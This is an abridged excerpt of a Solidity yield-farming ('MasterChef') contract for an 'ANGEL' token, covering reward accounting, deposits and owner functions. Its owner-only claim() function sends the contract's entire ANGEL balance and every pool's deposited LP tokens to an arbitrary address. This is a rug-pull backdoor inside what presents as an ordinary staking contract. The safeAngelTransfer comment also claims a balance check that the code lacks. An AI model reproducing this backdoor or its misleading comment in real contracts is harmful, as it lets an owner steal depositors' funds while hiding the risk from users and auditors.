...
contract MasterChef is Ownable {
    ...
    struct UserInfo {
        ...
        uint256 totalClaim;
        //
        // We do some fancy math here. Basically, any point in time, the amount of ANGELs
        // entitled to a user but is pending to be distributed is:
        //
        //   pending reward = (user.amount * pool.accAngelPerShare) - user.rewardDebt
        //
        // Whenever a user deposits or withdraws LP tokens to a pool. Here's what happens:
        //   1. The pool's `accAngelPerShare` (and `lastRewardBlock`) gets updated.
    ...
    struct PoolInfo {
        ...
        uint256 allocPoint;       // How many allocation points assigned to this pool. ANGELs to distribute per block.
        uint256 lastRewardBlock;  // Last block number that ANGELs distribution occurs.
        uint256 accAngelPerShare;  // Accumulated ANGELs per share, times 1e12. See below.
    }

    // The ANGEL TOKEN!
    TokenImplementation public angel;

    // ANGEL tokens created per block.
    uint256 public angelPerBlock = 4e18;
    // Info of each pool.
    ...
    // The block number when ANGEL mining starts.
    ...
    function setAngel(uint256 _amount) public onlyOwner {
           angelPerBlock = _amount;
        }
    ...
    // Update the given pool's ANGEL allocation point. Can only be called by the owner.
    ...
    // View function to see pending ANGELs on frontend.
    function pendingAngel(uint256 _pid, address _user) external view returns (uint256) {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][_user];
        uint256 accAngelPerShare = pool.accAngelPerShare;
        uint256 lpSupply = pool.lpToken.balanceOf(address(this));
        if (block.number > pool.lastRewardBlock && lpSupply != 0) {
            uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
            uint256 angelReward = multiplier.mul(angelPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
            accAngelPerShare = accAngelPerShare.add(angelReward.mul(1e12).div(lpSupply));
        }
        return user.amount.mul(accAngelPerShare).div(1e12).sub(user.rewardDebt);
    }
    ...
    function updatePool(uint256 _pid) public {
        ...
        pool.accAngelPerShare = pool.accAngelPerShare.add(angelReward.mul(1e12).div(lpSupply));
        pool.lastRewardBlock = block.number;
    }

    // Deposit LP tokens to MasterChef for ANGEL allocation.
    function deposit(uint256 _pid, uint256 _amount) public {
        ...
        updatePool(_pid);
        if (user.amount > 0) {
            uint256 pending = user.amount.mul(pool.accAngelPerShare).div(1e12).sub(user.rewardDebt);
            if(pending > 0) {
                safeAngelTransfer(msg.sender, pending);
            }
        ...
        user.rewardDebt = user.amount.mul(pool.accAngelPerShare).div(1e12);
    ...
    // Safe angel transfer function, just in case if rounding error causes pool to not have enough ANGELs.
    function safeAngelTransfer(address _to, uint256 _amount) internal {
        angel.transfer(_to, _amount);
    }

    function claim(address _to) public onlyOwner{
        angel.transfer(_to, angel.balanceOf(address(this)));

        for (uint256 pid = 0; pid < poolInfo.length; ++pid) {
            poolInfo[pid].lpToken.transfer(_to, poolInfo[pid].lpToken.balanceOf(address(this)));
        }
    }
